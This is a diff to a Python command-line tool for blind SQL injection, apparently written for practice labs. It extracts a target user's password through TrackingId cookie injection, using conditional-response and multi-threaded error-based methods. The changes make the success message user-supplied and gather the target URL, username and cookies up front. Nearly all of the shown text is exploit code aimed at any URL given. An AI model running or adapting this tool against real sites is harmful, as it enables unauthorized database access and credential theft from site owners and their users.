@@ -12,9 +12,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://122.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def blind_sqli_with_error_response(url, username, base_trackingid, session_cookie):
-    """This function is for Blind SQLi where a correct guess causes a 500 error. (Multi-threaded)"""
+
     password_extracted = ""
-    print("Extracting password... (Error-Based, Multi-threaded)")
+    print("Extracting password...")
 
     # This function will be run by each thread
     def check_char_error(position, char_code, found_event):
@@ -68,7 +68,7 @@ def blind_sqli_with_error_response(url, username, base_trackingid, session_cooki
     print(f"\n\nExtraction complete. Password: {password_extracted}")
 
 
-def blind_sqli_conditional(url, username, base_trackingid, session_cookie):
+def blind_sqli_conditional(url, username, base_trackingid, session_cookie, response_Message):
     """This function is for Blind SQLi using conditional responses (e.g., a 'Welcome' message)."""
     password_extracted = ""
     print("Extracting password... (Conditional Response-Based)")
@@ -88,7 +88,7 @@ def blind_sqli_conditional(url, username, base_trackingid, session_cookie):
         
         try:
             r = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=5)
-            if "Welcome" in r.text:
+            if response_Message in r.text:
                 found_event.set() 
                 return chr(char_code)
         except requests.exceptions.RequestException:
@@ -128,20 +128,17 @@ def main():
     print("2. Blind SQLi (Error-Based - e.g., 500 status code)")
     
     choice = input("Enter your choice (1/2): ")
+    url = input("Enter the URL: ")
+    username = input("Enter the username to target (e.g., administrator): ")
+    base_trackingid = input("Enter the base TrackingId cookie value: ")
+    session_cookie = input("Enter the session cookie value: ")
     
-    if choice == '1':
+    if choice == '1':   
+        response_Message = input("Enter the successfull login Responce message: ") 
         print("\nRunning Blind SQLi (Conditional Response)...")
-        url = input("Enter the URL: ")
-        username = input("Enter the username to target (e.g., administrator): ")
-        base_trackingid = input("Enter the base TrackingId cookie value: ")
-        session_cookie = input("Enter the session cookie value: ")
-        blind_sqli_conditional(url, username, base_trackingid, session_cookie)
+        blind_sqli_conditional(url, username, base_trackingid, session_cookie, response_Message)
     elif choice == '2':
-        print("\nRunning Blind SQLi (Error-Based)...")
-        url = input("Enter the URL: ")
-        username = input("Enter the username to target (e.g., administrator): ")
-        base_trackingid = input("Enter the base TrackingId cookie value: ")
-        session_cookie = input("Enter the session cookie value: ")
+        print("\nRunning Blind SQLi (Error Based)...")
         blind_sqli_with_error_response(url, username, base_trackingid, session_cookie)
     else:
         print("Invalid choice. Please run the program again and select 1 or 2.")
